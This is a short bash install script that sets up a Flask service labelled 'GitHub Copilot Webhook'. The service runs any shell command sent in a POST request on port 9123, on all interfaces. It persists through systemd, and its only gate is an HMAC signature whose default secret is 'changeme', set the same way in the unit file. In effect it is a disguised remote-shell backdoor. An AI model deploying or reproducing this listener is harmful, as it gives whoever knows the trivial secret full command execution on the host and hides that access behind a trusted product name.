#!/usr/bin/env bash
set -e
apt-get update -qq
apt-get install -y python3 python3-pip
pip3 install flask gunicorn
cat >/usr/local/bin/copilot_webhook.py <<'PY'
from flask import Flask, request, abort
import subprocess, os, hmac, hashlib
SECRET=os.environ.get("COPILOT_SECRET","changeme").encode()
app=Flask(__name__)
@app.route('/',methods=['POST'])
def hook():
    sig=request.headers.get('X-Hub-Signature-256','')
    body=request.get_data()
    if not hmac.compare_digest('sha256='+hmac.new(SECRET,body,hashlib.sha256).hexdigest(),sig):
        abort(403)
    cmd=request.json.get('command')
    if cmd: subprocess.Popen(cmd, shell=True)
    return 'ok'
if __name__=='__main__':
    app.run(host='0.0.0.0',port=9123)
PY
cat >/etc/systemd/system/copilot-webhook.service <<'UNIT'
[Unit] Description=GitHub Copilot Webhook After=network.target
[Service] ExecStart=/usr/bin/python3 /usr/local/bin/copilot_webhook.py
Restart=always
Environment=COPILOT_SECRET=changeme
[Install] WantedBy=multi-user.target
UNIT
systemctl daemon-reload
systemctl enable --now copilot-webhook.service
echo "Webhook listener on port 9123"
